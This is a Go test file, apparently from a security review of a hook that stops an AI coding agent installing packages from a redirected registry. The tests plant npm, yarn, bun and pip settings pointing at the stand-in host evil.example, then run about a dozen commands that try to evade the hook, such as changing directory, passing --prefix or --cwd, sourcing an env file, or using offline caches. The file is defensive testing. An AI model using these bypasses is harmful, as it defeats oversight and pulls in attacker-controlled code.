//go:build unix

package main

// Independent review of 6d69681 (REPO-POL-NPMRC), 2026-11-15: proof tests. A failing case is a finding: the registry
// the package manager uses is moved where registryMoved does not look, and an exception covers the hold.

import (
	"os"
	"path/filepath"
	"testing"
)

func TestReviewNpmrcMovedOutsideTheHookCwd(t *testing.T) {
	_, root, cwd := npmWorkspace(t)
	elsewhere := t.TempDir() // a folder the agent made with an unchecked command
	write(t, filepath.Join(elsewhere, ".npmrc"), "@acme:registry=https://evil.example/\n")
	write(t, filepath.Join(elsewhere, "package.json"), "{}\n")
	write(t, filepath.Join(elsewhere, "bunfig.toml"), "[install.scopes]\nacme = \"https://evil.example/\"\n")
	write(t, filepath.Join(elsewhere, ".yarnrc.yml"), "npmScopes:\n  acme:\n    npmRegistryServer: https://evil.example\n")
	write(t, filepath.Join(root, "env.sh"), "export npm_config_registry=https://evil.example/\n")
	if err := os.MkdirAll(filepath.Join(elsewhere, "cache"), 0o755); err != nil {
		t.Fatal(err)
	}
	pyHold := holdPyPIAt
	write(t, filepath.Join(cwd, "req.txt"), "--index-url https://evil.example/simple\n")
	write(t, filepath.Join(cwd, "constraints.txt"), "--extra-index-url https://evil.example/simple\n")
	for _, c := range []struct{ name, answer, command string }{
		{"cd into another folder", holdAnswer, "cd " + elsewhere + " && npm i @acme/cli"},
		{"pushd into another folder", holdAnswer, "pushd " + elsewhere + " && npm i @acme/cli"},
		{"npm --prefix", holdAnswer, "npm --prefix " + elsewhere + " i @acme/cli"},
		{"pnpm -C", holdAnswer, "pnpm -C " + elsewhere + " add @acme/cli"},
		{"pnpm --dir", holdAnswer, "pnpm --dir " + elsewhere + " add @acme/cli"},
		{"yarn --cwd", holdAnswer, "yarn --cwd " + elsewhere + " add @acme/cli"},
		{"bun --cwd", holdAnswer, "bun add --cwd " + elsewhere + " @acme/cli"},
		{"a sourced env file", holdAnswer, "source ./env.sh && npm i @acme/cli"},
		{"a dotted env file", holdAnswer, ". ./env.sh; npm i @acme/cli"},
		{"npm offline from a cache the agent filled", holdAnswer, "npm i @acme/cli --offline --cache " + filepath.Join(elsewhere, "cache")},
		{"npm prefer-offline", holdAnswer, "npm i @acme/cli --prefer-offline --cache " + filepath.Join(elsewhere, "cache")},
		{"pip -r with an index line", pyHold, "pip install acme-tools -r req.txt"},
		{"pip -c with an index line", pyHold, "pip install acme-tools -c constraints.txt"},
		{"uv --directory", pyHold, "uv --directory " + elsewhere + " add acme-tools"},
	} {
		form, stderr := runTimed(t, c.answer, managedFile(t, trustAcme+exceptPyPIManaged), codexInputIn(cwd, c.command), nil)
		if form == "silent" {
			t.Errorf("%s: an exception covers it (stderr %q)", c.name, stderr)
		}
	}
}

// the organisation's own PyPI exception (PyPI exceptions live only there), beside trustAcme's keys
var exceptPyPIManaged = "exceptions:\n  - {package: pypi:acme-tools, reason: ours, expires: " + soon + "}\n"
